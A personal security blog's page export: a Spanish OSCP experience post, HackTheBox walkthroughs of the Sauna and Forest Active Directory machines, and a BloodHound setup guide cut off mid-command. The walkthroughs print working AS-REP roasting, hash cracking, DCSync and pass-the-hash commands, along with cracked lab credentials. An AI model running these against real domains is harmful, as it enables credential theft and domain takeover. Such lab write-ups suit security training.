


[{"content":" Aprobé el OSCP! # Estoy orgulloso de contaros que he completado la certificación Offensive Security Certified Professional (OSCP). Ha sido una de las experiencias más duras y a la vez gratificantes de mi vida. Esta certificación me ha llevado al límite, ha puesto a prueba no sólo mis habilidades técnicas, sino también mi paciencia y disciplina.\nEn este post, voy a compartir cómo me preparé para el examen, qué herramientas y recursos me ayudaron más, y mi revisión honesta de todo el proceso - desde los laboratorios hasta el informe final.\nDesarrollar la mentalidad de «Try Harder». # Una de las lecciones más importantes que aprendí del OSCP es que este examen no sólo trata de habilidades técnicas, sino también de resistencia mental. Te atascarás. Muchas veces. Y eso está bien (al menos la mayoría de las veces). Lo que importa es cómo respondes. Mantener la calma, pensar metódicamente, aprender de los errores y seguir adelante incluso cuando las cosas parecen imposibles es una parte fundamental del proceso.\nOtro elemento clave es tomar buenas notas. Sin una documentación sólida, vas a perder horas repitiendo los mismos pasos. Personalmente, utilicé Obsidian para organizarlo todo: desde listas de comprobación de enumeraciones hasta trucos de privesc y frases de una sola línea. Tener mis propias notas estructuradas no sólo me ayudó durante los laboratorios, sino que fue absolutamente esencial durante el examen y para redactar el informe final.\nCrear un método de toma de notas no sólo me ayudó a pensar con más claridad y a seguir mi progreso en el hacking, sino que también me permitió comprender mejor cómo aprendo y crezco en general. Anotar las cosas me obligó a ir más despacio y a entender realmente lo que estaba haciendo, en lugar de apresurarme a seguir los pasos. Me ayudó a reconocer patrones en mis errores, a refinar mi metodología y a abordar los problemas con más calma.\nCon el tiempo, tomar notas se convirtió en algo más que una herramienta de estudio: pasó a formar parte de mi forma de procesar la información y reflexionar sobre mi aprendizaje, tanto técnica como personalmente, ya que te obliga a desacelerar y reflexionar. Usar Obsidian hizo más fácil conectar ideas, revisar conceptos pasados y mantenerme organizado a través de todo el viaje OSCP.\nTomar notas te obliga a desacelerar y reflexionar, que es algo que esta certificación requiere constantemente. Ayuda a construir tu metodología y te da confianza sabiendo que todo lo que has aprendido está a tu alcance.\nPreparación para el OSCP: ¿Qué funcionó para mí? # Antes incluso de plantearme presentarme al OSCP, pasé mucho tiempo en Hack The Box, resolviendo una larga lista de máquinas para construir una base sólida. Esa experiencia práctica me ayudó a desarrollar mi conjunto de habilidades y a construir un sólido «cinturón de herramientas» de técnicas. En mi opinión, la experiencia es clave, y trabajar en máquinas de estilo CTF es esencial para comprender la mentalidad y la metodología necesarias para certificaciones como la OSCP.\nDespués de eso, completé el CPTS Path de HTB Academy - en mi opinión, uno de los mejores recursos que existen para aprender hacking ético. Construye una base sólida a partir de cero, y por el precio, es demasiado bueno. Todavía no he hecho el examen CPTS, pero el curso en sí me dio una sólida comprensión de la metodología de las pruebas de penetración y me ayudó a reforzar muchos de los conceptos básicos que más tarde apliqué durante mi preparación para el OSCP.\nUna vez que me sentí lo suficientemente seguro, me inscribí en el curso OSCP (PEN-200). Repasé detenidamente los módulos de aprendizaje, tomé notas detalladas y practiqué las técnicas en los laboratorios incluidos. Contar con los conocimientos del CPTS sin duda me ayudó mucho. Después de eso, hice los Laboratorios de Desafío, que eran más avanzados y realmente me empujaron a aplicar todo lo que había aprendido.\nPara terminar mi preparación, trabajé en cajas de la lista de TJ Null\u0026rsquo;s OSCP-like para Proving Grounds para simular el entorno del examen. Estos me ayudaron a pulir mi flujo de trabajo y mejorar mi velocidad bajo presión, trabajando en una máquina al día durante unos 2-3 meses.\nEl día del examen: ¿Cómo fue? # El examen fue sin duda complicado, pero no imposible. Fue exactamente lo que esperaba después de toda la preparación. Lo más difícil de este examen no es el requerimiento técnico, sino la parte mental. Este examen sólo se puede aprobar si consigues mantener la calma y la concentración, por lo que son habilidades que se deben desarrollar.\nEn los días previos al examen, intenté estar lo más tranquilo posible y estar con la cabeza despejada. Piensa en planificar las comidas, descansos, beber agua y simplemente, mantener la calma. Ir con una mentalidad fría marcó una gran diferencia, pues debes evitar el pánico a toda costa cuando las cosas no funcionaban a la primera (cosa que me ocurrió varias veces durante el examen).\nPara hacer las cosas aún más interesantes, hice el examen en un MacBook M3, lo que añadió algunas (muchas XD) dificultades adicionales de compatibilidad y configuración. Pero funcionó - y estoy orgulloso de eso también jaja.\nTardé unas 18 horas en terminar el examen y el informe. Fui despacio y me apoyé mucho en mis apuntes. Al final acabé agotado, pero contento con el resultado.\n¿Qué es lo siguiente? # Mientras preparaba el OSCP, descubrí lo interesantes que son los entornos de Active Directory - la complejidad, las rutas de ataque, el pivoting\u0026hellip; realmente me pareció muy divertida esa rama del hacking.\nDicho esto, creo que verdadera pasión es el hacking web. Me encanta la creatividad y la profundidad que requiere, además de poder llegar a obtener un impacto grándisimo con heramientas básicas, como un navegador. Mis próximos pasos se centran en aprender más en ese mundo para empezar a desarrollarme en el Bug Bounty Hunting un poco más.\nPor supuesto, con el OSCP esto no ha hecho más que empezar!.\n","date":"16 April 2025","externalUrl":null,"permalink":"/posts/oscp/","section":"Posts","summary":"En este post, te cuento un resumen rápido de mi experiencia con el OSCP, desde cómo preparé la certificación hasta el día del examen. Echa un vistazo!","title":"Aprobé el OSCP: Así es como lo he hecho","type":"posts"},{"content":"","date":"16 April 2025","externalUrl":null,"permalink":"/categories/blog/","section":"Categories","summary":"","title":"Blog","type":"categories"},{"content":"","date":"16 April 2025","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"16 April 2025","externalUrl":null,"permalink":"/tags/certification-experience/","section":"Tags","summary":"","title":"Certification Experience","type":"tags"},{"content":"","date":"16 April 2025","externalUrl":null,"permalink":"/categories/post/","section":"Categories","summary":"","title":"Post","type":"categories"},{"content":"","date":"16 April 2025","externalUrl":null,"permalink":"/posts/","section":"Posts","summary":"","title":"Posts","type":"posts"},{"content":"","date":"16 April 2025","externalUrl":null,"permalink":"/","section":"S3ntinl","summary":"","title":"S3ntinl","type":"page"},{"content":"","date":"16 April 2025","externalUrl":null,"permalink":"/tags/","section":"Tags","summary":"","title":"Tags","type":"tags"},{"content":"","date":"31 January 2025","externalUrl":null,"permalink":"/tags/hackthebox-machine/","section":"Tags","summary":"","title":"Hackthebox Machine","type":"tags"},{"content":" Machine Info Platform HackTheBox Operative System Windows Difficulty Easy IP 10.10.10.175 Enumeration # As always, we start with Nmap:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.175 -oN ports Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-12 08:20 HST Nmap scan report for 10.10.10.175 Host is up (0.043s latency). PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 80/tcp open http Microsoft IIS httpd 10.0 |_http-title: Egotistical Bank :: Home |_http-server-header: Microsoft-IIS/10.0 | http-methods: |_ Potentially risky methods: TRACE 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-13 02:20:58Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 445/tcp open microsoft-ds? 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: 8h00m29s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required | smb2-time: | date: 2025-01-13T02:21:**05** First, we should take a look at port 80 to check the website.\nGenerating usernames from the web # In the about.html page we found some possible usernames, which is quite valuable in Windows enviroments to test for AS-REP Roastable accounts. We can save the usernames on a text file and with tools like username_generator we can create a list of possible valid usernames.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ git clone https://github.com/shroudri/username_generator Cloning into \u0026#39;username_generator\u0026#39;... remote: Enumerating objects: 16, done. remote: Counting objects: 100% (16/16), done. remote: Compressing objects: 100% (14/14), done. Receiving objects: 100% (16/16), 6.38 KiB | 3.19 MiB/s, done. Resolving deltas: 100% (2/2), done. remote: Total 16 (delta 2), reused 0 (delta 0), pack-reused 0 (from 0) ┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nano users.txt ┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ python3 username_generator/username_generator.py -w users.txt fergus smith f.smith f-smith f_smith f+smith fsmith fergussmith smithfergus fergus.smith smith.fergus hugo bear h.bear h-bear h_bear h+bear hbear Nice! As said, we can try to do AS-REP Roast with these new usernames. Let\u0026rsquo;s try!\nAS-REP Roast # AS-REP Roasting is an attack in Active Directory that exploits user accounts with the “Do not require Kerberos preauthentication” setting enabled. In a normal Kerberos authentication process, preauthentication prevents unauthorized access by requiring the client to encrypt a timestamp with the user’s password hash before requesting authentication.\nHowever, when this protection is disabled, an attacker can request an AS-REP (Authentication Service Response) for the target account without needing valid credentials. The Domain Controller then responds with an encrypted AS-REP message containing a Ticket Granting Ticket (TGT), which is encrypted using the user’s password hash. We could capture this response and crack it offline using tools like Hashcat.\nIn this case, we can perform this type of attack with the impacket script GetNPUsers:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ sudo impacket-GetNPUsers -request -usersfile mutated_users.txt -dc-ip 10.10.10.175 EGOTISTICAL-BANK.LOCAL/ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies /usr/share/doc/python3-impacket/examples/GetNPUsers.py:165: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC). now = datetime.datetime.utcnow() + datetime.timedelta(days=1) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) [-] Kerberos SessionError: KDC_ERR_C_PRINCIPAL_UNKNOWN(Client not found in Kerberos database) $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:4dcaa316dcec649688cb0371ea8277e9$64e3539a4e39c89428a623458153ba7e38f43a11ff14692160cfeb8471ccf26921ebdf5a6d6718a1f384326572845b0a86144ca9fe06b903e1c5b9d277f17b5c80dc1d9234d59f4bdf1173d8f8471cbfe7f4db197b9bd7ded4b15b85b73a138757cffbd3ff14f26bb0588702f2cc25c79c86411f613801ff2119a22e30cd7462c8abd608aa0390223d667920d57f81e0e8cbe9c1362c7d452fa6f16906c1ff351546f318838ba90baf85dd359c8a875659ab597b87b2d94bee275b5e4c997b2c660eb1500ee0cc1b7fe96578dbc4584a23ce64a58ec52f33a5fe62b0149fdf03607ac0e32423afd4b9776947eec5cfd6b3eb51340d66c47c34df3c4507158f69 Nice! It looks like we could retrieve the TGT. The next step is trying to crack it:\nCracking the hash # In order to crack the hash, I\u0026rsquo;ll use HashCat with the mode 18200:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ sudo hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:a8bd01da689627922de7e2d6ae592cd1$7713ccb10f010cde184f5d25974bedb64b3eb853362a3b73f9bb8406522b7ad9181059c95150045f22eedf51f83456065cfb1e8b5047936fc8ee4056c01b987477608982b208eef831d7913e4bcb0df485f2e0795f2dc92af975286f96350f2aafd6068f7ab88f4fd00805c53d61faa8708573bb8e6669953aca2de57df74efc3f9e501abb678bb61b1ef6d95728d60b71ce9593a74e929951eb85bbb9abe96a1d46950f20417299f7f80af4288eac5b228d5d799b0de30bfc8957dad1c4deb416f1e70916a774aed53950d451c4e05f77630a5668f9eb7b38e7b4a36e7b9e43733dfe7b1ff019f05536bc0313fe428114020227b9ada3bdcc485ebc0e4db579:Thestrokes23 Great! We managed to get credentials. Let\u0026rsquo;s try to get a shell as the user fsmith:\nFootHold # As the port 5985 is open, we can try to break in via WinRM:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ evil-winrm -i 10.10.10.175 -u fsmith -p Thestrokes23 *Evil-WinRM* PS C:\\Users\\FSmith\\Documents\u0026gt; whoami egotisticalbank\\fsmith User Flag # Time to read the user flag:\n*Evil-WinRM* PS C:\\Users\\FSmith\\Desktop\u0026gt; type user.txt a6395453...b505308e Privilege Escalation # Now we have to search our way to elevate privileges. After a bit of enumeration, I ran WinPEAS.exe, which is a pretty good tools for searching for privesc paths.\nThe output that this program generates is quite big, but there is something that stands out:\nÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials Some AutoLogon credentials were found DefaultDomainName : EGOTISTICALBANK DefaultUserName : EGOTISTICALBANK\\svc_loanmanager DefaultPassword : Moneymakestheworldgoround! More credentials! Let\u0026rsquo;s see what we can do with these:\nBloodHound # In Active Directory machines I recommend running BloodHound as is the easiest way to check for escalation paths.\nAs we can see, the user svc_loanmgr has the right to do a DCSync.\nDCSync # A DCSync attack is a technique in which an attacker abuses replication permissions in Active Directory to extract sensitive credentials. Normally, Domain Controllers synchronize user data among themselves using the Directory Replication Service (DRS). However, if an attacker gains control over an account with replication privileges, such as a Domain Admin or an account with the Replicating Directory Changes All permission, they can impersonate a Domain Controller and request password hashes for any user, including krbtgt.\nAn this is essentially what we can do with the svc_loanmgr user. This time, we can use the secretsdump script from Impacket.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ sudo impacket-secretsdump \u0026#39;EGOTISTICAL-BANK\u0026#39;/\u0026#39;svc_loanmgr\u0026#39;:\u0026#39;Moneymakestheworldgoround!\u0026#39;@\u0026#39;10.10.10.175\u0026#39; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets Administrator:500:aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:4a8899428cad97676ff802229e466e2c::: EGOTISTICAL-BANK.LOCAL\\HSmith:1103:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\\FSmith:1105:aad3b435b51404eeaad3b435b51404ee:58a52d36c84fb7f5f1beab9a201db1dd::: EGOTISTICAL-BANK.LOCAL\\svc_loanmgr:1108:aad3b435b51404eeaad3b435b51404ee:9cb31797c39a9b170b04058ba2bba48c::: SAUNA$:1000:aad3b435b51404eeaad3b435b51404ee:8e22e0a93dc3c341734c716a7144cc35 With the DCSync attack we managed to obtain the Administrator NTLM hash, which can be used with a tool such as PSExec to do a Pass-The-Hash type of login:\n┌──(s3n㉿kali)-[/opt/bloodhound] └─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e Administrator@10.10.10.175 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Microsoft Windows [Version 10.0.17763.973] (c) 2018 Microsoft Corporation. All rights reserved. C:\\Users\\Administrator\\Desktop\u0026gt; whoami nt authority\\system And the machine is rooted!\nC:\\Users\\Administrator\\Desktop\u0026gt; type root.txt 13474821...26f0e113 ","date":"31 January 2025","externalUrl":null,"permalink":"/posts/sauna/","section":"Posts","summary":"Sauna is an easy difficulty Windows machine that features Active Directory enumeration and exploitation. Possible usernames can be derived from employee full names listed on the website. With these usernames, an ASREPRoasting attack can be performed. After enumeration, BloodHound reveals that a user has the \u003cem\u003eDS-Replication-Get-Changes-All\u003c/em\u003e extended right, which allows to perform a DCSync attack.","title":"Sauna","type":"posts"},{"content":" Machine Info Platform HackTheBox Operative System Windows Difficulty Easy IP 10.10.10.161 Enumeration # As always, we start with Nmap:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ nmap -p53,88,135,139,445,464,493,636,3268,3269,5985,9389,47001 -sCV --min-rate 2000 -T5 -n -Pn 10.10.10.161 -oN ports PORT STATE SERVICE VERSION 53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2025-01-08 17:29:54Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 493/tcp closed ticf-2 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-title: Not Found |_http-server-header: Microsoft-HTTPAPI/2.0 9389/tcp open mc-nmf .NET Message Framing 47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP) |_http-server-header: Microsoft-HTTPAPI/2.0 |_http-title: Not Found Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: | smb2-time: | date: 2025-01-08T17:30:01 |_ start_date: 2025-01-08T17:19:43 | smb-security-mode: | account_used: \u0026lt;blank\u0026gt; | authentication_level: user | challenge_response: supported |_ message_signing: required | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2025-01-08T09:30:03-08:00 |_clock-skew: mean: 2h46m49s, deviation: 4h37m10s, median: 6m48s | smb2-security-mode: | 3:1:1: |_ Message signing enabled and required We have quite a few open ports. Let\u0026rsquo;s begin exploring each:\nRPC # We can connect with a null session to RPC to query for info such as domain users:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ rpcclient -U \u0026#39;\u0026#39; -N 10.10.10.161 rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] We find some users. Is a good practice to save all the useful information that we find, so I will create a users.txt file that would help us in the future for attacks like password sprays.\nA Password Spray attack consists of attempting a password across multiple user accounts within an organization, rather than targeting a single account with multiple attempts, thereby avoiding lockout mechanisms.\nAfter enumerating a bit, I find that the user svc-alfresco has the Do not require Kerberos preauthentication option enabled. Let\u0026rsquo;s check this.\nAS-Rep Roasting # An AS-REP Roasting attack targets user accounts in Active Directory that have the Do not require Kerberos preauthentication flag enabled. Attackers request a Kerberos AS-REP ticket for these accounts, which is returned encrypted with the user’s NTLM hash. Then, we can brute-force the hash offline to retrieve the plaintext password with a tool such as hashcat.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ sudo impacket-GetNPUsers -request -dc-ip 10.10.10.161 htb.local/ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies Name MemberOf PasswordLastSet LastLogon UAC ------------ ------------------------------------------------------ -------------------------- -------------------------- -------- svc-alfresco CN=Service Accounts,OU=Security Groups,DC=htb,DC=local 2025-01-08 07:40:04.738225 2025-01-08 07:40:01.956933 0x410200 $krb5asrep$23$svc-alfresco@HTB.LOCAL:44ad01dc17d4ba761d72ea7545970dcd$7806253f36fd17dd6d9669037ace47695e502faace5fa4e2409a727613d40d083db43a8f229c3feb8968f8a48fef57d4f71f526f19d66345e6662e3563756a92e9717357312ae3c7e0d16e6fe092b09b698fbd64a5e91d9b566f1d15c3dfeaad0f1eb7e6a73d8c8ea75aaad258df47071858092fde8b9eb2c649c30fcfe30f318da1196a789d4c915e4d5e63c876d73ffaa6ff568adab010d87586ec32cc8f023a824b922b192eb0d40db2efe04dc1450e297fadfbc46f452458810d0bcffbd33933e2b1d2039332d4953ac955fb4c27c61df64c039eb88c502e0be28a47a71fadca23864fdd Let\u0026rsquo;s crack the hash:\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ sudo hashcat -m 18200 hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force --show $krb5asrep$23$svc-alfresco@HTB.LOCAL:44ad01dc17d4ba761d72ea7545970dcd$7806253f36fd17dd6d9669037ace47695e502faace5fa4e2409a727613d40d083db43a8f229c3feb8968f8a48fef57d4f71f526f19d66345e6662e3563756a92e9717357312ae3c7e0d16e6fe092b09b698fbd64a5e91d9b566f1d15c3dfeaad0f1eb7e6a73d8c8ea75aaad258df47071858092fde8b9eb2c649c30fcfe30f318da1196a789d4c915e4d5e63c876d73ffaa6ff568adab010d87586ec32cc8f023a824b922b192eb0d40db2efe04dc1450e297fadfbc46f452458810d0bcffbd33933e2b1d2039332d4953ac955fb4c27c61df64c039eb88c502e0be28a47a71fadca23864fdd:s3rvice Now that we have the credentials svc-alfresco:s3rvice, we can try to access the machine via WinRM with a tool like evil-winrm.\nSetting a Foothold # We can access the machine abusing the WinRM protocol with evil-winrm, taking advantage of the credentials we just found.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice Evil-WinRM shell v3.7 Info: Establishing connection to remote endpoint *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; whoami htb\\svc-alfresco Nice! We are inside the system. We can now claim the user flag.\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; type user.txt 2bc3959f6...f9382ed94 Privilege Escalation # Now that we are inside the machine as a low-privileged user, we want to take control over the Administrator account in order to root the Domain Controller.\nWe can map out the Domain objects with BloodHound. Take a look at my BloodHound post where we discuss how to do a quick installation and start using it if you haven\u0026rsquo;t already!\nFirst, we need to recolect the information with SharpHound, so after uploading it to the machine, we do the following:\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; powershell -ep bypass *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; import-module ./SharpHound.ps1 *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; Invoke-BloodHound -CollectionMethod All -OutputDirectory C:\\Users\\svc-alfresco\\Desktop\\ -OutputPrefix \u0026#34;forest\u0026#34; *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; dir Mode LastWriteTime Length Name ---- ------------- ------ ---- -a---- 1/8/2025 1:47 PM 44043 forest_20250108134756_BloodHound.zip We have already pwned svc-alfresco, so we need to focus on how can we use this user to elevate our privileges. Next, we import the zip to BloodHound and let\u0026rsquo;s a look.\nAs we can see, this user is a member of Account Operators, a pretty powerful group. Microsoft says the following:\nThe Account Operators group grants limited account creation privileges to a user. Members of this group can create and modify most types of accounts, including accounts for users, Local groups, and Global groups. Group members can log in locally to domain controllers.\nMembers of the Account Operators group can\u0026rsquo;t manage the Administrator user account, the user accounts of administrators, or the Administrators, Server Operators, Account Operators, Backup Operators, or Print Operators groups. Members of this group can\u0026rsquo;t modify user rights.\nLet\u0026rsquo;s try the Shortest paths to Domain Admins query:\nWhich shows the following:\nAs we are a member of the Account Operators, we can create a user in the Exchange Windows Permissions Group to abuse the WriteDacl permission that this group has over the entire domain.\nWith WriteDacl we can do attacks such as DCSync. Let\u0026rsquo;s go step by step:\nWe create the user s3ntinl and add it to the Exchange Windows Permissions Group. *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; net user s3ntinl s3ntinl123! /add /domain The command completed successfully. *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; net group \u0026#34;Exchange Windows Permissions\u0026#34; s3ntinl /add The command completed successfully. Grant DCSync Privileges to s3ntinl: Remember to import powerview.ps1 if you haven\u0026rsquo;t already\n*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; $SecPassword = ConvertTo-SecureString \u0026#39;s3ntinl123!\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; $Cred = New-Object System.Management.Automation.PSCredential(\u0026#39;htb.local\\s3ntinl\u0026#39;, $SecPassword) *Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop\u0026gt; import-module ./powerview.ps1 *Evil-WinRM* PS C:\\Users\\svc-alfresco\\desktop\u0026gt; Add-DomainObjectAcl -Credential $Cred -TargetIdentity \u0026#34;DC=htb,DC=local\u0026#34; -PrincipalIdentity s3ntinl -Rights DCSync Abuse the DCSync with impacket-secretsdump: ┌──(s3n㉿kali)-[/opt/tools] └─$ sudo impacket-secretsdump \u0026#39;htb.local\u0026#39;/\u0026#39;s3ntinl\u0026#39;:\u0026#39;s3ntinl123!\u0026#39;@\u0026#39;10.10.10.161\u0026#39; Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:: ... [*] Cleaning up... Nice! We managed to dump all the hashes. Now we can abuse SMB with impacket-psexec and do a PassTheHash.\nIn a PtH attack, an attacker uses the NTLM hash of a user’s password to authenticate without knowing the actual password. PsExec supports this by leveraging Windows’ ability to authenticate via NTLM hashes when interacting with services like SMB.\n┌──(s3n㉿kali)-[~/Desktop/Box/recon] └─$ impacket-psexec -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6 Administrator@10.10.10.161 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies [*] Requesting shares on 10.10.10.161..... [*] Found writable share ADMIN$ ... C:\\Windows\\system32\u0026gt; whoami nt authority\\system Great! Let\u0026rsquo;s read the root flag and we can consider Forest as pwned!\nC:\\Windows\\system32\u0026gt; type C:\\Users\\Administrator\\Desktop\\root.txt 767c4284...1c365ef6 ","date":"11 January 2025","externalUrl":null,"permalink":"/posts/forest/","section":"Posts","summary":"Forest in an easy difficulty Windows Domain Controller, for a domain in which Exchange Server has been installed. The foothoold can be obtained via AS-REP Roasting. The service account is found to be a member of the Account Operators group, which can be used to add users to later exploit DCSync privileges.","title":"Forest","type":"posts"},{"content":" BloodHound # BloodHound is a powerful and widely used tool in the field of cybersecurity, particularly for penetration testers in Corporative Enviroments. It is designed to map and analyze Active Directory structures, helping identify security misconfigurations and potential attack paths that an adversary could exploit to escalate privileges or gain access to sensitive resources.\nBloodHound operates by collecting and visualizing relationships within an AD domain. These relations include group memberships, user permissions, trust relationships, and more. The tool’s strength lies in its ability to uncover complex chains of privileges that might be invisible to administrators manually auditing AD security.\nWe will do a quick installation step by step of the Community Version of BloodHound, as well and a small step by step tutorial on how to run both BloodHound and SharpHound taking as an example the Forest Machine from HackTheBox. Check out my post of the machine if you haven\u0026rsquo;t already!\nLet\u0026rsquo;s begin!\nInstallation # First, we need to install Docker:\nkali@kali:~$ sudo apt install -y docker.io kali@kali:~$ sudo systemctl enable docker --now Then, create the docker group if it does not exist:\nkali@kali:~$ sudo groupadd docker Add your user to the docker group:\nkali@kali:~$ sudo usermod -aG docker $USER Now, install docker-compose form github. Also, remember to give execution rights to the binary and add it to the /usr/bin directory.\nKeep in mind your architecture of Linux when downloading Docker-Compose. I use ARM Version of Kali Linux but you may use other version.\nkali@kali:~$ mv ./docker-compose-linux-aarch64 docker-compose kali@kali:~$ chmod +x ./docker-compose kali@kali:~$ mv ./docker-compose /usr/bin/ Lastly, we need to copy the BloodHound docker-compose.yml file to save it locally:\nkali@kali:~$ sudo wget https://ghst.ly/getbhce -O docker-compose.yml kali@kali:~$ docker-compose up BloodHound will be available on port 8080.\nSharpHound # SharpHound is the data collection component of BloodHound. It is a C# tool designed to gather information from Active Directory environments, which is then used by BloodHound to map and analyze attack paths. SharpHound collects data such as user sessions, group memberships, ACLs, and trust relationships, giving penetration testers and security analysts a detailed view of the environment.\nThe collected data is stored in JSON files, which are later imported into BloodHound for visualization and analysis. Together, SharpHound and BloodHound are a powerful duo for identifying and understanding security weaknesses in AD domains.\nBloodHound and SharpHound Usage # First, let\u0026rsquo;s log into BloodHound. We have it already running, so we need to access it on http://localhost:8080.\nThe first time we access BloodHound, we will need to input the random generated password found on the terminal window where docker-compose is running. Then, we will need to change it. The default user is admin.\nNow on the Download Collectors tab, we can download the latest version of SharpHound:\nHere, select SharpHound, and we’re almost ready to start collecting data! Just a few more steps:\nNext, upload the SharpHound executable to the Windows machine whose Active Directory you intend to map. From our Attacker Machine, we serve SharpHound from a Python Server:\n┌──(s3n㉿kali)-[/opt/bloodhound/sharphound] └─$ python3 -m http.server 80 Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ... From the Windows Machine, we download SharpHound with the following command:\nPS C:\\Users\\svc-alfresco\\Desktop\u0026gt; iwr -uri 